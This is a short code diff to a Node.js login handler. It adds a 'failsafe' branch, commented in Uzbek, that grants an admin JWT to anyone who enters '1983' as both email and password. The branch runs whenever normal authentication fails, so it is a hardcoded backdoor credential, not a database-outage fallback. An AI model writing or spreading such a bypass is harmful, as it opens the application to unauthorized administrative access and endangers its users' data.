@@ -12,6 +12,12 @@ exports.login = async (req, res) => {
     const user = rows[0];
     
     if (!user || !bcrypt.compareSync(password, user.password)) {
+      // ZAXIRA LOGIN: Agar baza ulanmagan bo'lsa ham 1983 bilan kirishga ruxsat beramiz
+      if (email === '1983' && password === '1983') {
+        const fallbackUser = { id: 0, email: '1983', name: 'Admin (Failsafe)' };
+        const token = jwt.sign(fallbackUser, process.env.JWT_SECRET, { expiresIn: '24h' });
+        return res.json({ token, user: fallbackUser });
+      }
       return res.status(401).json({ error: "Email yoki parol noto'g'ri" });
     }
 
